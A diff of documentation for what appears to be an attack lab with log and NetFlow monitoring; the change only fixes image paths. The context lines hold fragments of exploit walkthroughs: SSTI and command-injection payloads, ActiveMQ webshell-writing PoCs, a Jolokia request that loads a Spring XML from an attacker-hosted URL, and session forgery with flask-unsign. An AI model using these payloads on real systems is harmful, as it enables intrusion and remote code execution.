@@ -55,7 +55,7 @@ The `Monitoring` section provides information on the monitoring of the environme
 	- receiving and queuing logs from the log agent of each machine
 
 - Deployment scheme:
-		![Logs](img/Logs.drawio.png)
+		![Logs](../img/Logs.drawio.png)
 ##### NetFlow
 
 - [nprobe](https://www.ntop.org/products/netflow-probes/nprobe/) - NetFlow probe (on the firewall)
@@ -66,7 +66,7 @@ The `Monitoring` section provides information on the monitoring of the environme
 	- optional: receiving and queuing NetFlow packets from the NetFlow probe (nProbe on the firewall)
 
 - Deployment scheme:
-	![NetFlow](img/NetFlow.drawio.png)
+	![NetFlow](../img/NetFlow.drawio.png)
 
 ---
 # Attacks
@@ -869,7 +869,7 @@ http://<dst-ip>:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__s
 
 The command execution result will be displayed:
 
-![](img/flask-ssti-1.png)
+![](../img/flask-ssti-1.png)
 
 ```bash
 attacklog end --status <success|ran|error>
@@ -918,15 +918,15 @@ docker compose up -d
 
 Visit `http://<dst-ip>:8080` to see the Airflow management terminal, and enable the `example_trigger_target_dag` flag:
 
-![](img/airflow-cve-2020-11978-1.png)
+![](../img/airflow-cve-2020-11978-1.png)
 
 Click the "trigger" button on the right, then input the configuration JSON with the crafted payload `{"message":"'\";touch /tmp/airflow_dag_success;#"}`:
 
-![](img/airflow-cve-2020-11978-2.png)
+![](../img/airflow-cve-2020-11978-2.png)
 
 Wait a few seconds to see the execution success:
 
-![](img/airflow-cve-2020-11978-3.png)
+![](../img/airflow-cve-2020-11978-3.png)
 
 Check the CeleryWorker container to confirm `touch /tmp/airflow_dag_success` was executed:
 
@@ -934,7 +934,7 @@ Check the CeleryWorker container to confirm `touch /tmp/airflow_dag_success` was
 docker compose exec airflow-worker ls -l /tmp
 ```
 
-![](img/airflow-cve-2020-11978-4.png)
+![](../img/airflow-cve-2020-11978-4.png)
 
 ```bash
 attacklog end --status <success|ran|error>
@@ -996,7 +996,7 @@ Check the logs:
 docker compose logs airflow-worker
 ```
 
-![](img/airflow-cve-2020-11981-1.png)
+![](../img/airflow-cve-2020-11981-1.png)
 
 Verify the command was executed:
 
@@ -1004,7 +1004,7 @@ Verify the command was executed:
 docker compose exec airflow-worker ls -l /tmp
 ```
 
-![](img/airflow-cve-2020-11981-2.png)
+![](../img/airflow-cve-2020-11981-2.png)
 
 ```bash
 attacklog end --status <success|ran|error>
@@ -1072,7 +1072,7 @@ Content-Length: 83
 }
 ```
 
-![](img/1panel-cve-2024-39907-1.png)
+![](../img/1panel-cve-2024-39907-1.png)
 
 ```bash
 attacklog end --status <success|ran|error>
@@ -1132,7 +1132,7 @@ Authorization: Basic YWRtaW46YWRtaW4=
 Origin: http://localhost
 ```
 
-![](img/activemq-cve-2022-41678-1.png)
+![](../img/activemq-cve-2022-41678-1.png)
 
 There are 2 exploitable MBeans that can perform RCE.
 
@@ -1142,11 +1142,11 @@ There are 2 exploitable MBeans that can perform RCE.
 python poc.py -u admin -p admin http://<dst-ip>:8161
 ```
 
-![](img/activemq-cve-2022-41678-2.png)
+![](../img/activemq-cve-2022-41678-2.png)
 
 Webshell is written to `/admin/shell.jsp` successfully:
 
-![](img/activemq-cve-2022-41678-3.png)
+![](../img/activemq-cve-2022-41678-3.png)
 
 **Method #2** — using `jdk.management.jfr.FlightRecorderMXBean` to write a webshell (requires OpenJDK 11+):
 
@@ -1154,11 +1154,11 @@ Webshell is written to `/admin/shell.jsp` successfully:
 python poc.py -u admin -p admin --exploit jfr http://<dst-ip>:8161
 ```
 
-![](img/activemq-cve-2022-41678-4.png)
+![](../img/activemq-cve-2022-41678-4.png)
 
 Webshell is written to `/admin/shelljfr.jsp` successfully:
 
-![](img/activemq-cve-2022-41678-5.png)
+![](../img/activemq-cve-2022-41678-5.png)
 
 ```bash
 attacklog end --status <success|ran|error>
@@ -1235,7 +1235,7 @@ After the server starts, visit `http://<dst-ip>:8161` and log in with `admin` / 
 
 Without credentials the Jolokia API returns 401 Unauthorized:
 
-![](img/activemq-cve-2026-34197-1.png)
+![](../img/activemq-cve-2026-34197-1.png)
 
 Start an HTTP server on the attacker machine to serve a malicious Spring XML configuration file (e.g., executes `id > /tmp/success`):
 
@@ -1274,7 +1274,7 @@ Authorization: Basic YWRtaW46YWRtaW4=
 {"type":"exec","mbean":"org.apache.activemq:type=Broker,brokerName=localhost","operation":"addNetworkConnector(java.lang.String)","arguments":["static:(vm://evil?brokerConfig=xbean:http://<your_ip>/poc.xml)"]}
 ```
 
-![](img/activemq-cve-2026-34197-2.png)
+![](../img/activemq-cve-2026-34197-2.png)
 
 Verify the command was executed inside the container:
 
@@ -1283,7 +1283,7 @@ docker compose exec activemq ls -al /tmp/
 docker compose exec activemq cat /tmp/success
 ```
 
-![](img/activemq-cve-2026-34197-3.png)
+![](../img/activemq-cve-2026-34197-3.png)
 
 ```bash
 attacklog end --status <success|ran|error>
@@ -1351,7 +1351,7 @@ Get a session string from the login page cookie:
 curl -v http://<dst-ip>:8080/admin/airflow/login
 ```
 
-![](img/airflow-cve-2020-17526-1.png)
+![](../img/airflow-cve-2020-17526-1.png)
 
 Use [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) to crack the session key:
 
@@ -1359,7 +1359,7 @@ Use [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) to crack the sessi
 flask-unsign -u -c [session from Cookie]
 ```
 
-![](img/airflow-cve-2020-17526-2.png)
+![](../img/airflow-cve-2020-17526-2.png)
 
 Use the cracked key (`temporary_key`) to generate a new session with `user_id` = `1`:
 
@@ -1367,11 +1367,11 @@ Use the cracked key (`temporary_key`) to generate a new session with `user_id` =
 flask-unsign -s --secret temporary_key -c "{'user_id': '1', '_fresh': False, '_permanent': True}"
 ```
 
-![](img/airflow-cve-2020-17526-3.png)
+![](../img/airflow-cve-2020-17526-3.png)
 
 Use the generated session to log in as admin:
 
-![](img/airflow-cve-2020-17526-4.png)
+![](../img/airflow-cve-2020-17526-4.png)
 
 ```bash
 attacklog end --status <success|ran|error>
@@ -1439,7 +1439,7 @@ Content-Length: 339
 {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
 ```
 
-![](img/aj-report-cnvd-2024-15077-1.png)
+![](../img/aj-report-cnvd-2024-15077-1.png)
 
 ```bash
 attacklog end --status <success|ran|error>
@@ -1509,7 +1509,7 @@ Content-Disposition: form-data; name="1"
 ------kkkkkk123123213--
 ```
 
-![](img/apache-cxf-cve-2024-28752-1.png)
+![](../img/apache-cxf-cve-2024-28752-1.png)
 
 ```bash
 attacklog end --status <success|ran|error>
@@ -1627,7 +1627,7 @@ Content-Type: application/json
 }
 ```
 
-![](img/apache-druid-cve-2021-25646-1.png)
+![](../img/apache-druid-cve-2021-25646-1.png)
 
 ```bash
 attacklog end --status <success|ran|error>
@@ -1698,7 +1698,7 @@ Content-Length: 406
 }
 ```
 
-![](img/apisix-cve-2020-13945-1.png)
+![](../img/apisix-cve-2020-13945-1.png)
 
 Then use the evil router to execute arbitrary commands:
 
@@ -1706,7 +1706,7 @@ Then use the evil router to execute arbitrary commands:
 http://<dst-ip>:9080/attack?cmd=id
 ```
 
-![](img/apisix-cve-2020-13945-2.png)
+![](../img/apisix-cve-2020-13945-2.png)
 
 ```bash
 attacklog end --status <success|ran|error>
